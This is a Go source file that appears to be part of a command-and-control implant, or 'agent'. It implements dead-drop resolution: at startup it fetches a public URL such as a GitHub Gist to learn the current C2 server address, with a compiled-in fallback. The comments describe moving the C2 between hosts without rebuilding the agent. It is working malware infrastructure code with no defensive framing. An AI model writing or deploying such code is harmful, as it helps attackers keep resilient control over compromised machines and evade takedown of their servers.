package main

import (
	"io"
	"net/http"
	"strings"
	"time"
)

// DeadDropURL is a public URL (e.g. a GitHub Gist raw URL) that contains
// nothing but the current C2 base URL on the first line.
// Compiled in at build time:
//   go build -ldflags "-X main.DeadDropURL=https://gist.githubusercontent.com/..." .
// When the C2 moves (e.g. home PC → AWS), update the Gist.
// The agent will pick up the new address on next restart without rebuilding.
var DeadDropURL = ""

// resolveC2 returns the C2 URL to use.
// Priority: dead drop → compiled-in C2URL fallback.
// The dead drop is checked at startup only — no per-beacon overhead.
func resolveC2() string {
	if DeadDropURL == "" {
		return C2URL
	}
	discovered := fetchDeadDrop(DeadDropURL)
	if discovered != "" {
		return discovered
	}
	return C2URL
}

func fetchDeadDrop(url string) string {
	client := &http.Client{Timeout: 8 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return ""
	}
	body, err := io.ReadAll(io.LimitReader(resp.Body, 256))
	if err != nil {
		return ""
	}
	// First non-empty line that looks like a URL
	for _, line := range strings.Split(string(body), "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "http://") || strings.HasPrefix(line, "https://") {
			return line
		}
	}
	return ""
}
